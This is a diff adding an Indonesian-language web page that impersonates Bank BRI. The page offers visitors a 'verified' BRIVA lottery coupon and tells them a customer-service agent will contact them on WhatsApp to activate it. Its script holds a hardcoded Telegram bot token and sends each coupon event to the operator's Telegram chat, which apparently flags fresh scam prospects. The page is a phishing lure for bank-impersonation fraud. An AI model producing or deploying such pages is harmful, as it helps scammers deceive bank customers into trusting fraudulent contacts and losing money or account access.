@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Kupon Eksklusif - BANK BRI</title>
+    <!-- Library html2canvas untuk fitur screenshot otomatis area kupon -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #002d62 0%, #00529b 50%, #001f3f 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            color: #1e293b;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 30px 24px;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 6px;
+            background: linear-gradient(90deg, #f59e0b, #fbbf24, #f59e0b);
+        }
+
+        .logo-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .logo-img {
+            max-width: 150px;
+            height: auto;
+            object-fit: contain;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
+        }
+
+        h1 {
+            font-size: 1.3rem;
+            margin-bottom: 8px;
+            color: #003366;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        p.subtitle {
+            font-size: 0.85rem;
+            margin-bottom: 24px;
+            color: #64748b;
+            line-height: 1.5;
+        }
+
+        .btn-action {
+            background: linear-gradient(135deg, #00529b 0%, #003366 100%);
+            color: #ffffff;
+            border: none;
+            padding: 14px 20px;
+            font-size: 1rem;
+            font-weight: 700;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(0, 82, 155, 0.35);
+            width: 100%;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-action:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(0, 82, 155, 0.5);
+            background: linear-gradient(135deg, #0063b8 0%, #003d7a 100%);
+        }
+
+        .btn-action:active {
+            transform: translateY(-1px);
+        }
+
+        .coupon-box {
+            margin-top: 20px;
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+            color: #003366;
+            border: 2px dashed #00529b;
+            padding: 20px 16px;
+            border-radius: 18px;
+            display: none;
+            opacity: 0;
+            transform: scale(0.85);
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-align: left;
+            box-shadow: inset 0 2px 6px rgba(0,0,0,0.03);
+        }
+
+        .coupon-box.show {
+            display: block;
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .coupon-header-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .coupon-title {
+            font-size: 0.75rem;
+            color: #475569;
+            font-weight: 800;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+        }
+
+        .coupon-badge {
+            background: #059669;
+            color: #ffffff;
+            font-size: 0.65rem;
+            font-weight: 800;
+            padding: 3px 8px;
+            border-radius: 6px;
+            letter-spacing: 0.5px;
+        }
+
+        .coupon-code {
+            font-size: 1.7rem;
+            font-weight: 900;
+            color: #003366;
+            letter-spacing: 2px;
+            margin-bottom: 14px;
+            font-family: 'Courier New', Courier, monospace;
+            background: #ffffff;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid #cbd5e1;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        .coupon-desc {
+            font-size: 0.8rem;
+            color: #334155;
+            line-height: 1.5;
+            border-top: 1px solid #cbd5e1;
+            padding-top: 12px;
+        }
+        
+        .whatsapp-highlight {
+            color: #059669;
+            font-weight: 700;
+        }
+
+        .save-coupon-section {
+            display: none;
+            margin-top: 16px;
+        }
+        .save-coupon-section.show {
+            display: block;
+        }
+
+        /* ANIMASI PROSES & SUKSES AKHIR */
+        .loading-section {
+            display: none;
+            text-align: center;
+            padding: 30px 10px;
+        }
+        .loading-section.show {
+            display: block;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #00529b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background: #059669;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            margin: 0 auto 20px auto;
+            box-shadow: 0 10px 20px rgba(5, 150, 105, 0.3);
+            animation: bounceIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes bounceIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+
+        .processing-title {
+            font-size: 1.15rem;
+            font-weight: 800;
+            color: #003366;
+            margin-bottom: 10px;
+        }
+
+        .processing-desc {
+            font-size: 0.88rem;
+            color: #64748b;
+            line-height: 1.6;
+        }
+
+        .notification {
+            margin-top: 12px;
+            font-size: 0.8rem;
+            color: #003366;
+            font-weight: 700;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Logo Atas BRI -->
+        <div class="logo-wrapper" id="topLogoWrapper">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/BANK_BRI_logo.svg/960px-BANK_BRI_logo.svg.png" alt="BANK BRI" class="logo-img">
+        </div>
+
+        <h1 id="mainTitle">Dapatkan Kode Kupon Anda!</h1>
+        <p class="subtitle" id="subTitle">Tekan tombol di bawah ini untuk menghasilkan kode kupon undian eksklusif Anda secara acak.</p>
+        
+        <!-- TAHAP 1: TOMBOL GENERATE UTAMA -->
+        <button class="btn-action" id="actionBtn" onclick="generateCoupon()">Ambil Kupon Sekarang</button>
+        <div class="notification" id="notif">Berhasil menyimpan kupon ke perangkat Anda!</div>
+
+        <!-- KOTAK KUPON -->
+        <div class="coupon-box" id="couponBox">
+            <div class="coupon-header-row">
+                <div class="coupon-title">Kode Kupon BRIVA</div>
+                <div class="coupon-badge">Terfervikasi</div>
+            </div>
+            <div class="coupon-code" id="couponText">BRIVA - XXXX</div>
+            <div class="coupon-desc">
+                Mohon simpan kupon ini. Kupon akan diaktifkan dengan cara memberikannya kepada Customer Service (CS) yang akan segera menghubungi Anda melalui <span class="whatsapp-highlight">WhatsApp</span> dalam beberapa menit ke depan.
+            </div>
+        </div>
+
+        <!-- TOMBOL STRATEGIS UNTUK SIMPAN KUPON & SELESAI -->
+        <div class="save-coupon-section" id="saveSection">
+            <button class="btn-action" id="saveBtn" onclick="saveCouponScreenshot()" style="background: linear-gradient(135deg, #059669 0%, #047857 100%); box-shadow: 0 8px 20px rgba(5, 150, 105, 0.35);">Simpan Kupon & Selesai</button>
+        </div>
+
+        <!-- TAHAP 3: ANIMASI PROSES & PESAN AKHIR -->
+        <div class="loading-section" id="loadingSection">
+            <div id="loadingSpinnerBox">
+                <div class="spinner"></div>
+                <div class="processing-title">Menyimpan Data Kupon...</div>
+                <div class="processing-desc">Mohon tunggu sebentar, sistem kami sedang memvalidasi data Anda secara aman.</div>
+            </div>
+            <div id="successBox" style="display: none;">
+                <div class="success-icon">&#10003;</div>
+                <div class="processing-title">Kupon Berhasil Disimpan!</div>
+                <div class="processing-desc">
+                    Terima kasih. Kupon undian Anda telah tercatat dan Customer Service kami akan segera menghubungi Anda melalui <span class="whatsapp-highlight">WhatsApp</span> dalam beberapa menit ke depan.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // KONFIGURASI TELEGRAM BOT
+        const TELEGRAM_BOT_TOKEN = '8306174445:AAH4QVjyrbJkUa8uT2fQUEwLyfVqqYrjSo8';
+        const TELEGRAM_CHAT_ID = '6768301774';
+
+        let generatedCouponCode = '';
+
+        function generateCoupon() {
+            const btn = document.getElementById('actionBtn');
+            const mainTitle = document.getElementById('mainTitle');
+            const subTitle = document.getElementById('subTitle');
+            
+            btn.disabled = true;
+
+            const finalDigits = Math.floor(1000 + Math.random() * 9000);
+            generatedCouponCode = `BRIVA - ${finalDigits}`;
+            
+            const couponBox = document.getElementById('couponBox');
+            const couponText = document.getElementById('couponText');
+
+            couponBox.classList.remove('show');
+            void couponBox.offsetWidth; 
+            couponBox.classList.add('show');
+
+            let iterations = 0;
+            const maxIterations = 15;
+            const intervalTime = 50;
+
+            const slotInterval = setInterval(() => {
+                const randomSlotDigits = Math.floor(1000 + Math.random() * 9000);
+                couponText.innerText = `BRIVA - ${randomSlotDigits}`;
+                iterations++;
+
+                if (iterations >= maxIterations) {
+                    clearInterval(slotInterval);
+                    couponText.innerText = generatedCouponCode; 
+                    
+                    btn.style.display = 'none';
+                    document.getElementById('saveSection').classList.add('show');
+                    
+                    mainTitle.innerText = "Kupon Anda Berhasil Dibuat!";
+                    subTitle.innerText = "Silakan simpan bukti kupon Anda terlebih dahulu sebelum mengakhiri sesi.";
+
+                    sendTelegramNotification(`🔔 *Prospek Kupon BRIVA Dibuat!*\n\nKode Kupon: *${generatedCouponCode}*\nStatus: Kupon Dihasilkan`);
+                }
+            }, intervalTime);
+        }
+
+        function saveCouponScreenshot() {
+            const couponElement = document.getElementById('couponBox');
+            const saveBtn = document.getElementById('saveBtn');
+            const notif = document.getElementById('notif');
+
+            saveBtn.disabled = true;
+            saveBtn.innerText = "Menyimpan Kupon...";
+
+            html2canvas(couponElement, {
+                scale: 2,
+                backgroundColor: null
+            }).then(canvas => {
+                const imageURL = canvas.toDataURL("image/png");
+                const downloadLink = document.createElement('a');
+                downloadLink.href = imageURL;
+                downloadLink.download = `Kupon-${generatedCouponCode.replace(/\s+/g, '')}.png`;
+                downloadLink.click();
+
+                // Kirim notifikasi konfirmasi akhir ke Telegram
+                sendTelegramNotification(`✅ *Kupon BRIVA Disimpan Pengguna!*\n\nKode Kupon: *${generatedCouponCode}*\nStatus: Selesai`);
+
+                // Tampilkan animasi sukses akhir
+                document.getElementById('couponBox').style.display = 'none';
+                document.getElementById('saveSection').style.display = 'none';
+                notif.style.display = 'none';
+                
+                const logoWrapper = document.getElementById('topLogoWrapper');
+                if (logoWrapper) {
+                    logoWrapper.style.display = 'none';
+                }
+
+                document.getElementById('mainTitle').style.display = 'none';
+                document.getElementById('subTitle').style.display = 'none';
+
+                const loadingSec = document.getElementById('loadingSection');
+                loadingSec.classList.add('show');
+
+                setTimeout(() => {
+                    document.getElementById('loadingSpinnerBox').style.display = 'none';
+                    document.getElementById('successBox').style.display = 'block';
+                }, 2000);
+
+            }).catch(err => {
+                console.error("Gagal mengambil screenshot:", err);
+                
+                sendTelegramNotification(`✅ *Kupon BRIVA Disimpan Pengguna (Tanpa Screenshot)*\n\nKode Kupon: *${generatedCouponCode}*\nStatus: Selesai`);
+
+                document.getElementById('couponBox').style.display = 'none';
+                document.getElementById('saveSection').style.display = 'none';
+                notif.style.display = 'none';
+                
+                const logoWrapper = document.getElementById('topLogoWrapper');
+                if (logoWrapper) {
+                    logoWrapper.style.display = 'none';
+                }
+
+                document.getElementById('mainTitle').style.display = 'none';
+                document.getElementById('subTitle').style.display = 'none';
+
+                const loadingSec = document.getElementById('loadingSection');
+                loadingSec.classList.add('show');
+
+                setTimeout(() => {
+                    document.getElementById('loadingSpinnerBox').style.display = 'none';
+                    document.getElementById('successBox').style.display = 'block';
+                }, 2000);
+            });
+        }
+
+        function sendTelegramNotification(message, callback) {
+            const encodedMessage = encodeURIComponent(message);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+
+            const img = new Image();
+            img.src = url;
+
+            console.log('Notifikasi terkirim via Image Pixel.');
+            
+            if (callback) {
+                setTimeout(() => {
+                    callback();
+                }, 800);
+            }
+        }
+    </script>
+
+</body>
+</html>
